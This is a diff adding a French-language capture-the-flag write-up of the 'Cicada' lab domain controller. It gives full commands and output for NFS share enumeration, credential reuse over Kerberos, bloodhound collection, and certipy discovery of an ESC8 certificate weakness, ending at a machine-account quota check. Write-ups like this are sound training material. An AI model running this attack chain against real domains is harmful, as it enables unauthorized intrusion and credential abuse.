@@ -1,0 +1,184 @@
+VL - Cicada
+-----------
+
+Recon
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-01 15:10:38Z)
+111/tcp  open  rpcbind       2-4 (RPC #100000)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
+2049/tcp open  mountd        1-3 (RPC #100005)
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Domaine: cicada.vl
+Hostname: DC-JPQ225
+
+SMB / LDAP -> Nope
+
+NFS
+
+nxc nfs "10.10.69.21" -u 'guest' -p '' --shares
+NFS         10.10.69.21     2049   10.10.69.21      [*] Target supported NFS versions: (2, 3, 4)
+NFS         10.10.69.21     2049   10.10.69.21      [*] Enumerating NFS Shares
+NFS         10.10.69.21     2049   10.10.69.21      UID        Perms    Storage Usage    Share                          Access List
+NFS         10.10.69.21     2049   10.10.69.21      ---        -----    -------------    -----                          -----------
+NFS         10.10.69.21     2049   10.10.69.21      4294967294 rw-      18.0GB/23.4GB    /profiles                      No network
+
+Enumération du share profiles
+
+nxc nfs "10.10.69.21" -u 'guest' -p '' --enum-shares
+NFS         10.10.69.21     2049   10.10.69.21      [*] Target supported NFS versions: (2, 3, 4)
+NFS         10.10.69.21     2049   10.10.69.21      [*] Enumerating NFS Shares Directories
+NFS         10.10.69.21     2049   10.10.69.21      [+] /profiles
+NFS         10.10.69.21     2049   10.10.69.21      UID        Perms    File Size      File Path                                     Access List
+NFS         10.10.69.21     2049   10.10.69.21      ---        -----    ---------      ---------                                     -----------
+NFS         10.10.69.21     2049   10.10.69.21      4294967294 ---      402.0B         /profiles/Administrator/Documents/desktop.ini No network
+NFS         10.10.69.21     2049   10.10.69.21      4294967294 rwx      1.4MB          /profiles/Administrator/vacation.png          No network
+NFS         10.10.69.21     2049   10.10.69.21      4294967294 rw-      -              /profiles/Rosie.Powell/Documents/$RECYCLE.BIN/ No network
+NFS         10.10.69.21     2049   10.10.69.21      4294967294 rwx      402.0B         /profiles/Rosie.Powell/Documents/desktop.ini  No network
+NFS         10.10.69.21     2049   10.10.69.21      4294967294 rwx      1.7MB          /profiles/Rosie.Powell/marketing.png          No network
+
+Utilisateur: Rosie.Powell
+Récupération des images .png
+
+nxc nfs "10.10.69.21" -u 'guest' -p '' --get-file /profiles/Administrator/vacation.png vacation.png
+NFS         10.10.69.21     2049   10.10.69.21      [*] Target supported NFS versions: (2, 3, 4)
+NFS         10.10.69.21     2049   10.10.69.21      [*] Downloading /profiles/Administrator/vacation.png to vacation.png
+NFS         10.10.69.21     2049   10.10.69.21      File successfully downloaded to vacation.png from /profiles/Administrator/vacation.png
+[Feb 01, 2025 - 16:27:48 (CET)] exegol-cicada /workspace # nxc nfs "10.10.69.21" -u 'guest' -p '' --get-file /profiles/Rosie.Powell/marketing.png marketing.png
+NFS         10.10.69.21     2049   10.10.69.21      [*] Target supported NFS versions: (2, 3, 4)
+NFS         10.10.69.21     2049   10.10.69.21      [*] Downloading /profiles/Rosie.Powell/marketing.png to marketing.png
+NFS         10.10.69.21     2049   10.10.69.21      File successfully downloaded to marketing.png from /profiles/Rosie.Powell/marketing.png
+
+Sur l'image marketing.png, on retrouve un mot de passe Cicada123 sur un post-it
+
+Si on tente les creds on obtient le message d'erreur STATUS_NOT_SUPPORTED qui indique que le NTLM est désactivé sur le DC.
+
+nxc smb "10.10.69.21" -u 'Rosie.Powell' -p 'Cicada123'
+SMB         10.10.69.21     445    10.10.69.21      [*]  x64 (name:10.10.69.21) (domain:10.10.69.21) (signing:True) (SMBv1:False)
+SMB         10.10.69.21     445    10.10.69.21      [-] 10.10.69.21\Rosie.Powell:Cicada123 STATUS_NOT_SUPPORTED
+
+On peut utiliser kerberos en précisant le FQDN
+
+nxc smb "DC-JPQ225.cicada.vl" -u 'Rosie.Powell' -p 'Cicada123' -k
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False)
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
+
+Récupération de la liste des utilisateurs
+
+nxc smb "DC-JPQ225.cicada.vl" -u 'Rosie.Powell' -p 'Cicada123' -k --users | awk '{print $5}' | grep -vE '^\[|\-' > users.lst
+
+Lancement de bloodhound
+
+bloodhound.py --zip -c All -d "cicada.vl" -u "Rosie.Powell" -p "Cicada123" -dc "DC-JPQ225.cicada.vl" -ns 10.10.69.21 -k
+INFO: Found AD domain: cicada.vl
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: DC-JPQ225.cicada.vl
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: DC-JPQ225.cicada.vl
+INFO: Found 14 users
+INFO: Found 54 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC-JPQ225.cicada.vl
+INFO: Done in 00M 07S
+INFO: Compressing output into 20250201165957_bloodhound.zip
+
+On peut Enumérer les partages du l'utilisateur et voir CertEnroll qui indique la présence d'une PKI/WebEnrollment
+
+smbclient.py "cicada.vl"/"Rosie.Powell":"Cicada123"@"DC-JPQ225.cicada.vl" -k
+Impacket v0.13.0.dev0+20240918.213844.ac790f2b - Copyright Fortra, LLC and its affiliated companies
+
+[-] CCache file is not found. Skipping...
+Type help for list of commands
+# shares
+ADMIN$
+C$
+CertEnroll
+IPC$
+NETLOGON
+profiles$
+SYSVOL
+
+Obtenir un TGT pour énumérér la PKI avec certipy
+
+getTGT.py -dc-ip "DC-JPQ225.cicada.vl" "cicada.vl"/"Rosie.Powell":"Cicada123"
+Impacket v0.13.0.dev0+20240918.213844.ac790f2b - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in Rosie.Powell.ccache
+
+export KRB5CCNAME=Rosie.Powell.ccache
+
+certipy find -vulnerable -ns 10.10.69.21 -old-bloodhound -stdout -k -no-pass -dc-ip DC-JPQ225.cicada.vl
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Trying to get CA configuration for 'cicada-DC-JPQ225-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'cicada-DC-JPQ225-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'cicada-DC-JPQ225-CA' via RRP
+[*] Got CA configuration for 'cicada-DC-JPQ225-CA'
+[*] Saved BloodHound data to '20250201170746_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @BloodHoundAD
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : cicada-DC-JPQ225-CA
+    DNS Name                            : DC-JPQ225.cicada.vl
+    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
+    Certificate Serial Number           : 4CEA89D9FC3F5AB744EC1C0DA1EB01CA
+    Certificate Validity Start          : 2025-02-01 15:05:57+00:00
+    Certificate Validity End            : 2525-02-01 15:15:57+00:00
+    Web Enrollment                      : Enabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : CICADA.VL\Administrators
+      Access Rights
+        ManageCertificates              : CICADA.VL\Administrators
+                                          CICADA.VL\Domain Admins
+                                          CICADA.VL\Enterprise Admins
+        ManageCa                        : CICADA.VL\Administrators
+                                          CICADA.VL\Domain Admins
+                                          CICADA.VL\Enterprise Admins
+        Enroll                          : CICADA.VL\Authenticated Users
+    [!] Vulnerabilities
+      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
+Certificate Templates                   : [!] Could not find any certificate templates
+
+ESC8
+
+Solution :
+https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html
+https://i.blackhat.com/Asia-24/Presentations/Asia-24-Ding-CertifiedDCOM-The-Privilege-Escalation-Journey-to-Domain-Admin.pdf
+https://github.com/CICADA8-Research/RemoteKrbRelay
+
+La sortie montre que l'inscription web est activée, ce qui est très souvent vulnérable car il est possible de relayer l'authentification NTLM au service d'inscription web en imposant (coerce) une demande d'authentification HTTP pour un certificat au nom du contrôleur de domaine, mais ici nous n'avons qu'un seul serveur et l'authentification NTLM est désactivée d'après ce que nous avons vu et l'"autorelayage" n'est pas possible.
+
+Il est possible d'ajouter un compte machine si le quota le permet, ce qui peut être vérifié avec netexec
+
+nxc ldap "DC-JPQ225.cicada.vl" -u 'Rosie.Powell' -p 'Cicada123' -k -M maq
+LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [*]  x64 (name:DC-JPQ225.cicada.vl) (domain:cicada.vl) (signing:True) (SMBv1:False)
+LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [+] cicada.vl\Rosie.Powell:Cicada123
+MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [*] Getting the MachineAccountQuota
+MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl MachineAccountQuota: 10
+
